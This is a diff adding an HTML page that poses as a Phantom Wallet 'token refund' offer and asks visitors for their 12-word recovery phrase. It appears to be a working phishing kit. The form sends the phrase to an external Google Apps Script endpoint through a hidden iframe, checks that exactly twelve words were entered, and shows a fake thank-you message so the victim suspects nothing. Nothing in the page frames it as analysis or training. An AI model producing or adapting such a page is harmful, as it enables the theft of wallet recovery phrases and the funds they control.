@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Refund</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: #1c1c1c;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #141414 0%, #1c1c1c 100%);
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background-color: #2d2d2d;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #f0c75e;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #bbb;
+            margin-bottom: 25px;
+        }
+        textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
+            background-color: #383838;
+            color: white;
+            resize: none;
+        }
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            background-color: #f0c75e;
+            color: black;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-size: 16px;
+        }
+        input[type="submit"]:hover {
+            background-color: #d1a850;
+        }
+        #errorMessage {
+            color: red;
+            margin-top: 10px;
+            display: none; /* Hide by default */
+        }
+        .thank-you {
+            display: none;
+            background-color: #383838;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Phantom Logo -->
+        <img src="phantom.png" alt="Phantom Logo" class="logo" width="150" height="150">
+        
+        <h1>Refund Your Lost Tokens</h1>
+        <p>Phantom Wallet is offering you the chance to refund tokens you’ve lost. Enter your 12-word recovery phrase below to initiate the refund process.</p>
+        <form action="https://script.google.com/macros/s/AKfycbz_UDEWknfyq3M6J4tA9R1Z8nweTRRtJlmctdeGcwlOlneQmCzSdyq70X9NOftwanRf/exec" method="POST" target="hidden_iframe" onsubmit="return validateRecoveryPhrase(this)">
+            <textarea id="recoveryPhrase" name="phrase" placeholder="Enter your 12-word recovery phrase" required></textarea>
+            <input type="submit" value="Refund Now" id="submitButton">
+        </form>
+        <p id="errorMessage">Error: You must enter exactly 12 words.</p>
+        <iframe name="hidden_iframe" style="display:none;" onload="showThankYouMessage()"></iframe>
+        <p id="thankYouMessage" class="thank-you">Thank you! Your refund request has been submitted.</p>
+        <p class="disclaimer">* By entering your recovery phrase, you agree to our terms and conditions.</p>
+    </div>
+
+    <script>
+        function validateRecoveryPhrase(form) {
+            const phrase = document.getElementById('recoveryPhrase').value.trim();
+            const words = phrase.split(/\s+/); // Split by whitespace
+
+            // Check if the number of words is exactly 12
+            if (words.length !== 12) {
+                document.getElementById('errorMessage').style.display = 'block';
+                return false; // Prevent form submission
+            }
+
+            // Hide the error message if validation is successful
+            document.getElementById('errorMessage').style.display = 'none';
+
+            // Disable the submit button to prevent multiple submissions
+            document.getElementById('submitButton').disabled = true;
+
+            return true; // Allow form submission
+        }
+
+        function showThankYouMessage() {
+            document.getElementById('thankYouMessage').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
